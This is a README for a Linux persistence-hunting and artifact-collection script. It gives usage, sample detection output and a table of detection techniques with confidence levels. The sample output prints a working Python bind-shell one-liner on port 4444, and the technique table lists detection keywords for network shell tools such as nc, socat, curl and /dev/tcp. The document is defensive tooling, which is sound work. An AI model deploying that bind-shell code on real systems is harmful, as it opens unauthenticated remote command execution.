# Linux Persistence Detection, Hunting and Arftifact Collection

- [Summary](#summary)
- [Usage](#usage)
- [Example Detections](#example-detections)
- [Table of Techniques](#techniques)

## Summary
[`persisthunt.sh`](./persisthunt.sh) helps speed up investigations by collecting targeted persistence-related artifacts and highlighting suspicious patterns commonly associated with Linux persistence techniques.

The script assists in persistence detection, threat hunting, and artifact collection across well-known Linux persistence mechanisms. Findings are categorized into three levels - `High`, `Low`, and `Informational` based on confidence and severity. Examples include suspicious autorun entries referencing `/tmp/`, `/home/`, `/dev/tcp`, `curl`, or detection of active bind/reverse shells.

It is designed as a flexible foundation that defenders can customize for their environments by adding or removing detection logic and keywords. The output can be large and may require environment-specific analysis, but it is also suitable for review and summarization using LLMs or AI agents.

## Usage
Run as root user and redirect output to a file
```
sudo persisthunt.sh > output.log
```

Run on a remote host via SSH
```
ssh root@10.0.0.1 'bash -s' < persisthunt.sh > output.log 2>&1
```

## Example Detections


```
=== [HIGH] Active reverse shell ===
bob      3889906  0.0  0.0   2800  1848 pts/2    S+   06:38   0:00 sh -i

=== [HIGH] Active bind shell ===
LISTEN 0      1                                     0.0.0.0:4444  0.0.0.0:* users:(("python3",pid=3891687,fd=3))
bob      3891687  0.7  0.3  19540 12320 pts/3    S+   06:41   0:00 python3 -c exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",4444));s1.listen(1);c,a=s1.accept(); while True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")

=== [HIGH] eBPF programs with raw network sockets (possible BPFdoor persistence) ===
PID: 3903559, Executable: bpfdoorpoc, Stack trace: /proc/3903559/stack:[<0>] packet_recvmsg+0x6e/0x5c0

=== [LOW] Recent ELF binary in tmp/home/hidden dirs ===
/var/tmp/.test
```

## Techniques

| Confidence | Technique | Description |
|---|---|---|
| High | AT Job Persistence | Legit 'at' jobs are uncommon; unexpected entries in /var/spool/at are highly suspicious. |
| High | Cron entry referencing a suspicious keyword | Cron files that reference curl/wget/nc/ncat/socat or paths like /tmp, /var/tmp, /dev/shm, /home, or hidden files. |
| High | Active bind shell | Detect interpreter processes (bash/sh/zsh/dash/ksh/python*/perl/nc/ncat/socat) that are listening on network sockets (bind shells). |
| High | Active reverse shell | Detect processes whose stdin and stdout are redirected to sockets, indicating reverse shells. |
| High | Persistence using eBPF raw network socket| Rootkits such as BPFdoor use eBPF programs with raw network sockets for persistent backdoor. [Read more](https://github.com/raj3shp/bpfdoorpoc/tree/main) |
| High | Systemd service/timer referencing a suspicious keyword | Search .service and .timer files under systemd paths (including user units under ~/.config/systemd/user/) for suspicious keywords. |
| High | Init/rc.local/profile script referencing a suspicious keyword | Init scripts and rc.local/profile files that reference suspicious keywords or network/tools in persistence paths. |
| High | MOTD script referencing a suspicious keyword | MOTD scripts that reference suspicious keywords or persistence tooling. |
| High | Shell profile referencing a suspicious keyword | Shell profiles (/etc/profile, /etc/profile.d, ~/.bashrc, ~/.profile, etc.) containing suspicious commands or paths. |
| High | D-BUS service files referencing a suspicious keyword | D-BUS service files found in path \*/dbus-1/\* referencing suspicious keywords |
| High | NetworkManager dispatcher scripts referencing a suspicious keyword | NetworkManager dispatcher scripts found in path \*/NetworkManager/dispatcher.d/\* referencing suspicious keywords |
| High | Hidden ELF executable files in tmp/home/hidden dirs | Hidden dotfiles (names beginning with a dot) in /tmp, /var/tmp, /home, /dev/shm that are ELF executables. |
| High | Running processes | Running processes referencing a suspicious keyword |
| High | SUID/SGID/world-writable ELF binary | World-writable files with SUID or SGID bits set that are ELF binaries (potential privilege escalation/backdoor). |
| High | Hidden process detected in /proc (possible rootkit) | Enumerate /proc PIDs and compare against ps output to find processes hidden by rootkits (e.g., Diamorphine); includes notes on how attackers backdoor ps to hide PIDs. |
| High | Hidden process with bind mount trick | Detect mounts that bind over /proc/<pid> (e.g., mount -o bind mydir /proc/1234) which can hide process entries from ps. |
| High | LD_PRELOAD configured system wide | Presence or modification of /etc/ld.so.preload which can be abused by rootkits for persistence. |
| Low | Files with capabilities | Files on the system with POSIX capabilities set (from `getcap`) — lower-confidence indicator but worth checking. |
| Low | Recent ELF binary in tmp/home/hidden dirs | Recently modified or created executable ELF binaries (within 7 days) in /tmp, /var/tmp, /dev/shm, /home — lower-confidence indicator. |
| Low | Git config or hooks file | Non-sample git config or hooks files (e.g., .git/config or .git/hooks/*) which could be abused for persistence. |
| Low | APT Hooks | APT Hooks could be abused for persistence. |
| Low | Yum/DNF plugins | Yum/DNF plugins referencing a suspicious keyword |
| Low | .pth file with suspicious content (Python persistence) | .pth files containing executed imports or calls like import, os.system, exec() which run on Python module import. |
| Low | udev rules | Udev rules with RUN key (possible persistence) |
| Low | PAM modules | PAM modules referencing pam_exec which could be abused for persistence |
| Low | Hijacking system binaries | Recent modified binary files in /bin /sbin /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin/ |
| Informational | All cron entries (manual review) | Print all cron-related files and their (non-comment) contents for manual review. |
| Informational | All shell profiles (manual review) | Print contents of all system and user shell profile files for manual inspection. |
| Informational | All init.d and rc.local scripts (manual review) | Print init.d and rc.local scripts for manual inspection. |
| Informational | All MOTD files (manual review) | Print MOTD and update-motd.d scripts/files for manual review. |
| Informational | Recent (7 days) ELF binaries (manual review) | List recent executable ELF files (7 days) for manual review. |
| Informational | List all dotfiles in home directories (manual review) | Enumerate dotfiles in user home directories for manual review. |
| Informational | SSH authorized keys in home directories (manual review) | Print non-empty authorized_keys files in /root and /home for manual inspection. |
| Informational | Local users and groups (manual review) | List local users and groups via getent for manual review. |
| Informational | Mounts (manual review) | Print current mounts for manual inspection. |
| Informational | Active Network connections (manual review) | Show active network connections (ss -tunap) for manual review. |
| Informational | Systemd services (manual review) | List running systemd services (systemctl list-units --type=service --state=running). |
| Informational | D-BUS service files (manual review) | Find D-BUS service files under dbus-1 directories for review. |
| Informational | NetworkManager dispatcher scripts | NetworkManager-dispatcher runs scripts on network changes; check dispatcher.d executable scripts under NetworkManager for potential persistence. |
| Informational | Container images and running containers | List all container images and running containers with Docker, Podman and Containerd |
| Informational | Installed packages | List all installed packages with dpkg/rpm/dnf |
| Informational | Loaded kernel modules | List all loaded kernel modules |
